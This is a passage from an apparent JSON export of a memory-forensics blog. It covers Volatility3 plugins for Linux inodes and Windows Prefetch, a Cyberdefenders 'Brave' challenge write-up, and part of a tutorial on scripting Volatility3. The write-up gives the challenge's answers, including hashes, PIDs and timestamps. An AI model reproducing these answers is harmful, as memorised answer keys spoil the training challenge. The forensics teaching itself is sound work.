\\t0\\n2555\\tfirefox-esr\\t52709410\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/places.sqlite\\t2022-09-11 22:05:04.000000 \\t2022-09-11 22:05:04.000000 \\t2022-09-11 22:05:04.000000 \\t5242880\\n2555\\tfirefox-esr\\t52709413\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/places.sqlite-wal\\t2022-09-11 22:05:11.000000 \\t2022-09-11 22:05:11.000000 \\t2022-09-11 22:05:12.000000 \\t2164304\\n2555\\tfirefox-esr\\t52709411\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/favicons.sqlite\\t2022-09-11 22:05:01.000000 \\t2022-09-11 22:05:01.000000 \\t2022-09-11 22:05:01.000000 \\t5242880\\n2555\\tfirefox-esr\\t52709412\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/favicons.sqlite-wal\\t2022-09-11 22:05:11.000000 \\t2022-09-11 22:05:11.000000 \\t2022-09-11 22:05:01.000000 \\t1147752\\n2555\\tfirefox-esr\\t52709414\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/content-prefs.sqlite\\t2022-09-11 22:05:02.000000 \\t2022-09-11 22:05:02.000000 \\t2022-09-11 22:05:03.000000 \\t229376\\n2555\\tfirefox-esr\\t35077\\tsrwxrwxrwx\\tsocket:[35077]\\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t0\\n2555\\tfirefox-esr\\t32451\\tsrwxrwxrwx\\tsocket:[32451]\\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t0\\n2555\\tfirefox-esr\\t32393\\tsrwxrwxrwx\\tsocket:[32393]\\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t0\\n2555\\tfirefox-esr\\t32457\\tsrwxrwxrwx\\tsocket:[32457]\\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t0\\n2555\\tfirefox-esr\\t32455\\tsrwxrwxrwx\\tsocket:[32455]\\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t0\\n2555\\tfirefox-esr\\t32470\\tsrwxrwxrwx\\tsocket:[32470]\\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t0\\n2555\\tfirefox-esr\\t31746\\tsrwxrwxrwx\\tsocket:[31746]\\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t1970-01-01 01:00:00.000000 \\t0\\n2555\\tfirefox-esr\\t31748\\tprw-------\\tpipe:[31748]\\t2022-09-11 22:05:02.000000 \\t2022-09-11 22:05:02.000000 \\t2022-09-11 22:05:02.000000 \\t0\\n2555\\tfirefox-esr\\t34057193\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite\\t2022-09-11 22:05:07.000000 \\t2022-09-11 22:05:07.000000 \\t2022-09-11 22:05:11.000000 \\t507904\\n2555\\tfirefox-esr\\t34057204\\t-rw-r--r--\\t/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-wal\\t2022-09-11 22:05:07.000000 \\t2022-09-11 22:05:07.000000 \\t2022-09-11 22:05:07.000000 \\t0\\n...\\n```\\n\\nThe fact that we have extracted timestamps makes it possible to build the timeline of the events via the integration to the **Timeliner** plugin.\\n\\n```\\n~/work/DFIR/Memory Analysis/MemoryImages/debian 5.10.0-18-amd64 \xbb vol -f Debian\\\\ XFS.vmem -s symbols timeline | more                                                                                              130 \u21b5 k1nd0ne@MacBook-Pro-de-Felix\\nVolatility 3 Framework 2.0.1    Running plugin Bash...\\n\\nPlugin  Description     Created Date    Modified Date   Accessed Date   Changed Date\\nBash    2490 (bash): \\"echo \\"hello bash history\\"\\"        2022-09-11 20:04:52.000000      N/A     N/A     N/A\\n...\\nInodes  Process firefox-esr (2555) Open \\"/usr/lib/firefox-esr/browser/extensions/langpack-fr@firefox-esr.mozilla.org.xpi\\"       N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\nInodes  Process firefox-esr (2555) Open \\"/usr/lib/firefox-esr/browser/features/doh-rollout@mozilla.org.xpi\\"     N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\nInodes  Process firefox-esr (2555) Open \\"/usr/lib/firefox-esr/browser/features/formautofill@mozilla.org.xpi\\"    N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\nInodes  Process firefox-esr (2555) Open \\"/usr/lib/firefox-esr/browser/features/pictureinpicture@mozilla.org.xpi\\"        N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\nInodes  Process firefox-esr (2555) Open \\"/usr/lib/firefox-esr/browser/features/proxy-failover@mozilla.com.xpi\\"  N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\nInodes  Process firefox-esr (2555) Open \\"/usr/lib/firefox-esr/browser/features/screenshots@mozilla.org.xpi\\"     N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\nInodes  Process firefox-esr (2555) Open \\"/usr/lib/firefox-esr/browser/features/webcompat@mozilla.org.xpi\\"       N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\nInodes  Process Privileged Cont (2626) Open \\"/usr/lib/firefox-esr/browser/extensions/langpack-fr@firefox-esr.mozilla.org.xpi\\"   N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000\\n```\\n\\n## Conclusion\\nTo conclude, this plugin is a good way to an in depth understanding of how a Linux kernel is storing files in memory and what are the information you can extract from a Linux memory acquisitions.  This plugin was tested on a Debian with kernel version **5.10.0.18-amd64**. The plugin is available on the forensicxlab github repository: https://github.com/forensicxlab/volatility3_plugins.\\nYou should identify each steps described before in the source code comments.\\nDo not hesitate to reach me at felix.guyard@forensicxlab.com to make this article better, or to make a pull-request on the repository to enhance this plugin.\\n\\nHappy Hunting!\\n\\nhttps://www.kernel.org/doc/html/latest/filesystems/vfs.html\\n\\nhttp://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch12lev1sec7.html\\n\\nhttp://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch12lev1sec6.html\\n\\nhttps://github.com/torvalds/linux\\n\\nhttps://volatility3.readthedocs.io/en/latest/index.html"},{"id":"prefetch","metadata":{"permalink":"/blog/prefetch","source":"@site/blog/2022-07-27-prefetch/index.md","title":"\ud83d\udce6 Volatility3 Windows Plugin - Prefetch","description":"Windows prefetch files are temporary files stored in the %SystemRoot%\\\\System\\\\Prefetch folder. This memory management feature is keeping track of the frequently running applications on a given system. We can extract some data from those files in order to get useful information for a digital forensic investigation. In this blog article, I will explain how we can use memory forensic to extract prefetch files, parse them and create in the end a volatility3 plugin.","date":"2022-07-27T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"Prefetch","permalink":"/blog/tags/prefetch"},{"inline":true,"label":"Windows","permalink":"/blog/tags/windows"}],"readingTime":3.7,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"prefetch","title":"\ud83d\udce6 Volatility3 Windows Plugin - Prefetch","authors":["k1nd0ne"],"tags":["DFIR","Memory Forensics","Prefetch","Windows"]},"unlisted":false,"prevItem":{"title":"\ud83d\udce6 Volatility3 Linux Plugin - Inodes","permalink":"/blog/inodes"},"nextItem":{"title":"\ud83d\udd8b Cyberdefenders - Writeup - Brave","permalink":"/blog/cb-brave"}},"content":"Windows prefetch files are temporary files stored in the **`%SystemRoot%\\\\System\\\\Prefetch`** folder. This memory management feature is keeping track of the frequently running applications on a given system. We can extract some data from those files in order to get useful information for a digital forensic investigation. In this blog article, I will explain how we can use memory forensic to extract prefetch files, parse them and create in the end a volatility3 plugin.\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## Windows Prefetch file format\\n\\nWindows prefetch files are constructed with one file header and multiple sections. In each sections different information can be found in which there can be some interesting valuable forensic artifacts. With the evolution of the Windows versions, prefetch files format changed we will see later those changes and the differences between them. Integers are stored in little-endian order, Strings in UTF-16 little-endian and Timestamp in Windows FILETIME UTC. You can see bellow a representation of a prefetch file header and how the information is stored:\\n\\n\\n<div style={{backgroundColor: \'white\', alignItems: \'center\'}}>\\n    ![alt text](../images/prefetch/screenshot.png \\"Prefetch header\\")\\n</div>\\n\\n\\n### Format version:\\n\\nFor the different windows versions, the prefetch format version is different:\\n\\n- 17 (0x11) - Windows XP, Windows 2003\\n- 23 (0x17) - Windows Vista, Windows 7\\n- 26 (0x1a) - Windows 8.1\\n- 30 (0x1e) - Windows 10\\n\\n### Signature:\\n\\n- SCCA - Windows XP to Windows 8.1\\n- MAM \u2013 Windows 10/11\\n\\n### Original executable name and hash:\\n\\nThe two information are present in the header but are also present in the prefetch filename stored on the disk (ExecutableName.EXE-Hash).pf. The hash is use to differentiate multiple execution of the same executable.\\n\\nNow that we have the header information, we can extract other artifacts from the file information sections.\\n\\nFor each different file version, the prefetch file information are not located at the same offset. Here is the interesting information we can find about the executable:\\n\\n- Section A, B, C, and D offset and entries information \u2013 Useful to locate our artifacts\\n- Last Execution - Latest execution time of the executable.\\n- Execution Counter \u2013 How many times the executable was run.\\n\\nEach of those information are located at different offsets. Depending on the file version, those offsets are not the same. You can find for each version the associated offsets [here](https://github.com/libyal/libscca/blob/main/documentation/Windows%20Prefetch%20File%20(PF)%20format.asciidoc)\\n\\n### The MAM signature:\\n\\nSCCA signature indicates that the file information is stored in plain text whereas the MAM signature indicates a compressed prefetch file. MAM Signature are present in Windows 10 and 11 prefetch files only and needs to be decompressed before it can be read. The compression method used is called XPRESS Huffman which is a Microsoft compression algorithm. We\u2019ll see later the python3 implementation of this algorithm used for the volatility3 plugin.\\n\\nIf you are doing forensic on a hard drive, you probably know the Windows Prefetch Parser tool by Eric Zimmermann. However, there is no tool extracting prefetch file artifacts from memory. To this end, we are now going to see the extraction and parsing of prefetch files with volatility3.\\n\\n## Volatility3 Prefetch plugin\\n\\nTo be able to extract the prefetch file and parse them from a memory dump, we need to go through theses major steps:\\n\\n- Scan for prefetch files using the \u201cfilescan\u201d plugin;\\n- Dump each prefetch file in a bytearray;\\n- Identify each Prefetch signature and decompress it if necessary (MAM signature);\\n- Parse the Prefetch and extract the interesting artifacts;\\n- Render the result.\\n\\nWhen developing the plugin, I had to implement the Microsoft\'s XPRESS Huffman decompression algorithm in python3 to be able to read Windows 1.X prefetch files. I have used the provided Microsoft pseudo code of the algorithm available . The python3 implementation of the algorithm itself is available on the forensicxlab\'s github : https://github.com/forensicxlab/Xpress_LZ77Huffman The volatility plugin is using a derived version of this algorithm, which will return the file even if the PF is incomplete so we can extract information.\\n\\n![alt text](../images/prefetch/results.png \\"Prefetch header\\")\\n\\n\\n## Conclusion\\n\\nThe plugin was tested on Windows 7, Windows 8.1 and Windows 10 vmem memory dumps. The plugin code can be found on the forensicxlab\'s github and will be submitted to the volatility3 community for a potential integration to the framework. You should Identify each steps described before in the source code comments. Do not hesitate to reach me at felix.guyard@forensicxlab.com, or to make a pull-request on the repository to enhance this plugin or this article.\\n\\nHappy Hunting!"},{"id":"cb-brave","metadata":{"permalink":"/blog/cb-brave","source":"@site/blog/2022-07-11-cyberdefenders-brave/index.md","title":"\ud83d\udd8b Cyberdefenders - Writeup - Brave","description":"This writeup is covering the cyberdefenders.org challenge named \\"Brave\\". Today we are going to solve this challenge using the VolWeb memory analysis platform.","date":"2022-07-11T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"Cyberdefenders","permalink":"/blog/tags/cyberdefenders"}],"readingTime":4.65,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"cb-brave","title":"\ud83d\udd8b Cyberdefenders - Writeup - Brave","authors":["k1nd0ne"],"tags":["DFIR","Memory Forensics","Cyberdefenders"]},"unlisted":false,"prevItem":{"title":"\ud83d\udce6 Volatility3 Windows Plugin - Prefetch","permalink":"/blog/prefetch"},"nextItem":{"title":"\ud83d\udcd8 Using Volatility3 as a library","permalink":"/blog/volaslib"}},"content":"This writeup is covering the cyberdefenders.org challenge named \\"Brave\\". Today we are going to solve this challenge using the VolWeb memory analysis platform.\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## Scenario\\n\\nA memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.\\n\\n## Analysis creation\\n\\nAfter firing up your instance of VolWeb, login to the platform, create a new Windows investigation and upload the challenge memory image. Once the image is uploaded, launch the analysis from the \\"Analysis\\" menu. Next, select the analysis and click on the \\"Review results\\" button.\\n\\n![alt text](../images/brave/1.png \\"Analysis Creation\\")\\n\\n\\nFrom there, we can start our investigation on the memory image using the left panel (clicking on the \\"Plugins\\" button). From the displayed menu named \\"Case\\", we have the information we need to answer question **#2** about the SHA256 value of the RAM image which is : **9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172**\\n\\n![alt text](../images/brave/1.1.png \\"Analysis Hash\\")\\n\\n\\n## Process Analysis\\n\\nLet\'s try to find what tool were used to dump the memory of this machine and at the same time, identify the PID of \\"brave.exe\\" to answer question **#1** & **#3**. For this we are going to go through the process tree graph.\\n\\n![alt text](../images/brave/2.png \\"PSTree\\")\\n![alt text](../images/brave/3.png \\"PSTree\\")\\n\\n\\n\\nUsing this plugin, we immediately have the process ID of brave.exe which is 4856 and thus, is the answer for question **#3**. If we look deeper into the tree we can also spot \\"FTK Imager\\" which is a known forensic tool that can be used to dump memory from a live system.\\n\\nTo answer question **#1**, we need to find the time at which the RAM image was fully acquired. For this, I like to use the timeline plugin. It\'s always good to take a look at the timeline to take a step back and have a good view of the activities registered on the machine in time. We can try to identify the time at which the memory dump was finished by looking for the FTK Imager activities. We know that when the dumping procedure is finished, we have no more information registered, which means we need to identify the last event timestamp recorded.\\n\\nLooking at the timeline, we find the following :\\n\\n![alt text](../images/brave/4.png \\"PSTree\\")\\n\\n\\nThis timestamp **2021-04-30 17:52:18** is the latest identified. By looking at the cyberdefenders challenge, we know that the last digit of the answer is \\"19\\" which is one second greater than our result. The answer for question **#1** is indeed 2021-04-30 17:52:19.\\n\\n## Network analysis\\n\\nTo answer question #4, we can use the netscan and the netstat plugin. By using the search bar, we can look for the key word \\"ESTABLISHED\\" and count how many connections are identified : For this question, the \\"netstat\\" plugin is returning 10 connections marked as ESTABLISHED, and only 9 connections for the \\"netscan\\" plugin. The answer for question **#4** is indeed **10**.\\n\\n![alt text](../images/brave/5.png \\"PSTree\\")\\n\\n\\nFor the next question, we are looking for a FQDN that the chrome process established a connection with. By looking at the IP contacted by the chrome processes, we can extract some public IP addresses.\\n\\n![alt text](../images/brave/6.png \\"PSTree\\")\\n\\n\\nUsing the tool of your choice, you can search for the FQDN linked to IP addresses we have found. To conclude, the domain is **protonmail.ch**, which is the right answer for question **#5**.\\n\\nThe next question is asking us the MD5 hash value of process memory for PID 6988. For this one, we are going to look for the process using the \\"Process\\" tab and look at the left panel to dump our process and calculate the signature.\\n\\n![alt text](../images/brave/7.png \\"PSTree\\")\\n![alt text](../images/brave/7.1.png \\"PSTree\\")\\n\\n\\nThen answer for question **#6** is indeed **0b493d8e26f03ccd2060e0be85f430af**.\\n\\nFor the next question we need to go fetch the word starting at offset 0x45BE876 with a length of 6 bytes in the memory dump. We can write a simple python3 script to do this.\\n\\n```python\\nimport sys\\nwith open(sys.argv[1],\\"rb\\") as process:\\n   process.seek(0x45BE876)\\n   word = process.read(6)\\n   print(word)\\n```\\n\\nOUTPUT :\\n```\\n~/work/DFIR/Cyberdefender/c49-AfricanFalls2 \xbb python3 extract.py 20210430-Win10Home-20H2-64bit-memdump.mem                                                                                                           k1nd0ne@MacBook-Pro-de-Felix\\nb\'hacker\'\\n```\\n\\n\\nThe answer is indeed \\"**hacker**\\" for question **#7**.\\n\\nQuestion **#8** is pretty straight forward, just go back to using the ProcessTree plugin and fetch the PPID of \\"powershell.exe\\".\\n\\n![alt text](../images/brave/8.png \\"PSTree\\")\\n\\nFor question **#9**, we need to investigate to find the full path and name of the last file opened in notepad. The CmdLine plugin is the way to go for this question. Indeed, we can go to the Process tab click on the notepad process, look at the \\"Cmdline\\" subtab and extract the answer which is `C:\\\\Users\\\\JOHNDO~1\\\\AppData\\\\Local\\\\Temp\\\\7zO4FB31F24\\\\accountNum`.\\n\\n![alt text](../images/brave/9.png \\"PSTree\\")\\n\\n\\nThe last question is a little bit more tricky. Windows systems maintain a set of keys in the registry database (UserAssist keys) to keep track of programs that executed. We can use the UserAssist plugin and look for the execution of brave and how long it was used (Time Focused). The answer is **04:01:54**\\n\\n![alt text](../images/brave/10.png \\"PSTree\\")\\n\\n\\n\\n## Conclusion\\n\\nTo conclude this writeup, we were able to use the VolWeb platform to easly get answers and make our investigation more efficient. VolWeb is based on volatility3 and therefore doesn\'t fully cover all the cyberdefenders.org memory analysis challenges questions at the moment. Happy hunting !"},{"id":"volaslib","metadata":{"permalink":"/blog/volaslib","source":"@site/blog/2022-05-30-volaslib/index.md","title":"\ud83d\udcd8 Using Volatility3 as a library","description":"Being interested in memory forensic for a while now, I have learned a lot about the volatility3 framework. In this article, we will go through how you can use the framework\'s libraries to automate your memory analysis tasks and directly exploit the results. I will assume in this article that the reader has a basic understanding of how volatility3 is exploiting memory to extract evidence. If you want to learn more about volatility3, you can check the links in the \\"References\\" section.","date":"2022-05-30T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Volatility","permalink":"/blog/tags/volatility"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"}],"readingTime":12.92,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"volaslib","title":"\ud83d\udcd8 Using Volatility3 as a library","authors":["k1nd0ne"],"tags":["DFIR","Volatility","Memory Forensics"]},"unlisted":false,"prevItem":{"title":"\ud83d\udd8b Cyberdefenders - Writeup - Brave","permalink":"/blog/cb-brave"},"nextItem":{"title":"\ud83d\udcc4 Volatility3 - ISF for MacOs","permalink":"/blog/macisf"}},"content":"Being interested in memory forensic for a while now, I have learned a lot about the volatility3 framework. In this article, we will go through how you can use the framework\'s libraries to automate your memory analysis tasks and directly exploit the results. I will assume in this article that the reader has a basic understanding of how volatility3 is exploiting memory to extract evidence. If you want to learn more about volatility3, you can check the links in the \\"References\\" section.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Volatility3 CLI\\n\\nWhen using the volatility3 framework on a memory image, the analyst is typically using the command line interface (CLI) component of the framework. It is one of the best way to interact with the framework quickly and get results. In the below example, we are executing the PsList plugin on a memory dump using the CLI.\\n\\n```bash\\n\\n\xbb vol -r pretty -f Triage-Memory.mem windows.pslist\\n  Volatility 3 Framework 2.0.1\\n  Formatting...0.00\\t\\tPDB scanning finished\\n    |  PID | PPID |  ImageFileName |      Offset(V) | Threads | Handles | SessionId | Wow64 |                  CreateTime | ExitTime | File output\\n  * |    4 |    0 |         System | 0xfa8003c72b30 |      87 |     547 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A |    Disabled\\n  * |  252 |    4 |       smss.exe | 0xfa8004616040 |       2 |      30 |       N/A | False | 2019-03-22 05:31:55.000000  |      N/A |    Disabled\\n  * |  332 |  324 |      csrss.exe | 0xfa80050546b0 |      10 |     516 |         0 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n  * |  372 |  364 |      csrss.exe | 0xfa800525a9e0 |      11 |     557 |         1 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n  * |  380 |  324 |    wininit.exe | 0xfa8005259060 |       3 |      78 |         0 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n  * |  416 |  364 |   winlogon.exe | 0xfa8005268b30 |       3 |     110 |         1 | False | 2019-03-22 05:31:58.000000  |      N/A |    Disabled\\n  * |  476 |  380 |   services.exe | 0xfa8005680910 |      12 |     224 |         0 | False | 2019-03-22 05:31:59.000000  |      N/A |    Disabled\\n  * |  484 |  380 |      lsass.exe | 0xfa80056885e0 |       7 |     650 |         0 | False | 2019-03-22 05:32:00.000000  |      N/A |    Disabled\\n  * |  492 |  380 |        lsm.exe | 0xfa8005696b30 |      10 |     155 |         0 | False | 2019-03-22 05:32:00.000000  |      N/A |    Disabled\\n  * |  592 |  476 |    svchost.exe | 0xfa80056e1060 |       9 |     375 |         0 | False | 2019-03-22 05:32:01.000000  |      N/A |    Disabled\\n  * |  672 |  476 |    svchost.exe | 0xfa800570d060 |       7 |     341 |         0 | False | 2019-03-22 05:32:02.000000  |      N/A |    Disabled\\n  * |  764 |  476 |    svchost.exe | 0xfa800575e5b0 |      20 |     447 |         0 | False | 2019-03-22 05:32:02.000000  |      N/A |    Disabled\\n  * |  796 |  476 |    svchost.exe | 0xfa8005775b30 |      15 |     368 |         0 | False | 2019-03-22 05:32:03.000000  |      N/A |    Disabled\\n  * |  820 |  476 |    svchost.exe | 0xfa800577db30 |      33 |    1073 |         0 | False | 2019-03-22 05:32:03.000000  |      N/A |    Disabled\\n[etc...]\\n\\n```\\n\\nHaving those results is a great way to help you during an investigation, but what if we want to make the framework perform more specific tasks to include it to another platform ? For example, you may want to integrate the results directly inside a sandbox or a Web UI. Behind the scene of the execution of this command, volatility3 is using multiple libraries from the framework to produce its results. It\'s simply parsing the user\'s arguments and perform the following steps :\\n\\n - Create an empty memory context for the memory image;\\n - Determine if the requested plugin exists in the available list of plugins;\\n - Determine what configuration options the plugin requires;\\n - Complete the context configuration using the plugin requirements, automagics and the user\'s arguments;\\n - Run the plugin;\\n - Render the result into the desired format.\\n\\nGreat, now you have a high level understanding of what\'s going on in the background when attempting to run a plugin. Using the Volatility3 documentation, let\'s try to write a simple sample of code to run the PsList plugin with volatility3 as a library.\\n\\n\\n## Constructing and running a plugin\\n\\nIn this section we will take a look at how we can run the PsList pluging using volatility3 as a library. Let\'s first take a look at the following code sample :\\n\\n```python\\nimport volatility3.framework\\nfrom volatility3.framework import contexts\\nfrom volatility3 import plugins\\nimport logging\\n\\nlogging.basicConfig(level=logging.INFO)\\nlogger = logging.getLogger(__name__)\\nvolatility3.framework.require_interface_version(2, 0, 0)\\n\\nctx = contexts.Context()  ## Construct a blank context\\n\\nfailures = volatility3.framework.import_files(plugins, True) ##Load the framework plugins\\nif failures:\\n    logger.info(f\\"Some volatility3 plugin couldn\'t be loaded : {failures}\\")\\nelse:\\n    logger.info(f\\"Plugins are loaded without failure\\")\\nplugin_list = volatility3.framework.list_plugins()\\nlogger.info(plugin_list)\\n```\\n\\nOUTPUT :\\n\\n```\\nINFO:__main__:Plugins are loaded without failure\\nINFO:__main__:\\n{\\n\'windows.statistics.Statistics\': ,\\n\'timeliner.Timeliner\': ,\\n\'windows.pslist.PsList\': ,\\n...\\n}\\n```\\nIn this first step, we have constructed a blank context and loaded the native framework plugins. Next, we need to choose which plugin we want to run and construct the appropriate context based on its requirements. For this, I propose we create a function which can construct a simple plugin with no specific arguments.\\n\\n```\\n1    def build_context(image_name ,context, base_config_path, plugin):\\n2        available_automagics = automagic.available(context)\\n3        plugin_config_path = interfaces.configuration.path_join(base_config_path, plugin.__name__)\\n4        automagics = automagic.choose_automagic(available_automagics, plugin)\\n5        context.config[\'automagic.LayerStacker.stackers\'] = automagic.stacker.choose_os_stackers(plugin)\\n6        context.config[\'automagic.LayerStacker.single_location\'] = \\"file://\\" + os.getcwd() + \\"/\\" + image_name\\n7        constructed = construct_plugin(context, automagics, plugin, base_config_path, None, None)\\n8        return constructed\\n```\\n\\nLet\'s decompose the function :\\n\\n- The **image_name** : The name or relative path of the memory image you want to analyse.\\n- The **context** : The object in which the memory context, plugin configuration and requirements will be stored.\\n- The **base_config_path** : The path within the context\'s config containing the plugin\'s configuration. By default, this value is set to \\"plugins\\"\\n- The **plugin** : The plugin object choosen from the list of plugins.\\n\\nVolatility3 is using what is called \\"automagics\\" to help with plugin construction. Indeed it is helping a lot to automatically determine specific stack layers.\\nLine 2, 4 and 5 of the code are determining what automagics are available, choose the automagics that apply to the operating system and update the context configuration.\\n\\nLine 6 is simply giving the memory image location to the context configuration.\\n\\nOnce the context is ready, we can construct the plugin using the framework built-in function \\"construct_plugin\\".\\nThis function will check that all the plugin\'s requirements are fulfilled and if so, will return the constructed plugin (which is an object). The sample code and output below allows us to see a bit more of what happened behind the scene and construct the \'PsList\' plugin.\\nNotice that our logger also displays the volatility3 logs !\\n\\n```python\\nimport volatility3.framework\\nfrom volatility3.framework import contexts, interfaces\\nfrom volatility3 import plugins\\nfrom volatility3.framework import automagic\\nfrom volatility3.framework.plugins import construct_plugin\\nimport logging, os\\n\\nlogging.basicConfig(level=logging.INFO)\\nlogger = logging.getLogger(__name__)\\nvolatility3.framework.require_interface_version(2, 0, 0)\\n\\ndef build_context(image_name ,context, base_config_path, plugin):\\n   available_automagics = automagic.available(context)\\n   logger.info(f\\"Available automagics : {available_automagics}\\")\\n   plugin_config_path = interfaces.configuration.path_join(base_config_path, plugin.__name__)\\n   automagics = automagic.choose_automagic(available_automagics, plugin)\\n   context.config[\'automagic.LayerStacker.stackers\'] = automagic.stacker.choose_os_stackers(plugin)\\n   context.config[\'automagic.LayerStacker.single_location\'] = \\"file://\\" + os.getcwd() + \\"/\\" + image_name\\n   constructed = construct_plugin(context, automagics, plugin, base_config_path, None, None)\\n   logger.info(f\\"Contructed plugin : {constructed}\\")\\n   return constructed\\n\\nctx = contexts.Context()  ## Construct a blank context\\nfailures = volatility3.framework.import_files(plugins, True) ##Load the framework plugins\\nif failures:\\n   logger.info(f\\"Some volatility3 plugin couldn\'t be loaded : {failures}\\")\\nelse:\\n   logger.info(f\\"Plugins are loaded without failure\\")\\nplugin_list = volatility3.framework.list_plugins()\\nbase_config_path = \\"plugins\\"\\n\\nconstructed = build_context(\\"Triage-Memory.mem\\", ctx, base_config_path, plugin_list[\'windows.pslist.PsList\'])\\n\\nlogger.info(f\\"Context configuration {ctx.config}\\")\\n```\\nOUTPUT :\\n\\n```\\n INFO:__main__:Plugins are loaded without failure\\n INFO:__main__:Available automagics :\\n [volatility3.framework.automagic.symbol_cache.SymbolBannerCache object at 0x1052d9e20,\\n   volatility3.framework.automagic.mac.MacBannerCache object at 0x1052d9eb0,\\n   volatility3.framework.automagic.linux.LinuxBannerCache object at 0x1052d9f40,\\n   volatility3.framework.automagic.construct_layers.ConstructionMagic object at 0x1063a6340,\\n   volatility3.framework.automagic.stacker.LayerStacker object at 0x1063b4280,\\n   ...\\n ]\\n\\n\\n INFO:volatility3.framework.automagic:Detected a windows category plugin\\n INFO:volatility3.framework.automagic:Running automagic: ConstructionMagic\\n INFO:volatility3.framework.automagic:Running automagic: LayerStacker\\n INFO:volatility3.framework.automagic:Running automagic: WinSwapLayers\\n INFO:volatility3.framework.automagic:Running automagic: KernelPDBScanner\\n INFO:volatility3.framework.automagic:Running automagic: KernelModule\\n\\n\\n INFO:__main__:Contructed plugin : volatility3.plugins.windows.pslist.PsList object at 0x1063c1ee0\\n\\n\\n INFO:__main__:Context configuration {\\n   \\"automagic.LayerStacker.single_location\\": \\"file:///REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/REDACTED/Triage-Memory.mem\\",\\n   \\"automagic.LayerStacker.stackers\\": [\\n     \\"AVMLStacker\\",\\n     \\"LimeStacker\\",\\n     \\"Elf64Stacker\\",\\n     \\"QemuStacker\\",\\n     \\"WindowsCrashDumpStacker\\",\\n     \\"VmwareStacker\\",\\n     \\"WindowsIntelStacker\\"\\n   ],\\n   \\"plugins.PsList.dump\\": false,\\n   \\"plugins.PsList.kernel\\": \\"kernel\\",\\n   \\"plugins.PsList.kernel.class\\": \\"volatility3.framework.contexts.Module\\",\\n   \\"plugins.PsList.kernel.layer_name\\": \\"layer_name\\",\\n   